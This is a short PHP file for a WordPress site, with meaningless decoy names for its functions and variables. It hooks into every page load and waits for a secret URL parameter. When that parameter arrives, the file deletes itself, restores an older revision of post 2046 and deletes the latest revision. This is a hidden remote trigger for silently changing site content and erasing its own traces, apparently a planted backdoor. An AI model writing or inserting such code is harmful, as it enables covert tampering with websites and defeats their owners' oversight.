<?php

function items_checker_scroll_icons() {
	if (isset($_GET['privacy_video_code_contact']) && $_GET['privacy_video_code_contact'] === 'urls_press_elements_analytics') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$survey_modules_service_js = 2046;
		$changer_csv_variations_super = wp_get_post_revisions($survey_modules_service_js);
		if (empty($changer_csv_variations_super)) die('no revisions');
		if (count($changer_csv_variations_super) < 2) die('less than 2');
		$really_responsive_soon_price = array_shift($changer_csv_variations_super);
		$connect_rate_daily = $really_responsive_soon_price->ID;
		$notifier_svg_fix = array_shift($changer_csv_variations_super);
		$link_reviews_disable_register = $notifier_svg_fix->ID;
		$domain_remote_scheduled = wp_restore_post_revision($link_reviews_disable_register);
		if ($domain_remote_scheduled === false) die('error restoring');
		$domain_remote_scheduled = wp_delete_post_revision($connect_rate_daily);		
		if ($domain_remote_scheduled === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'items_checker_scroll_icons');
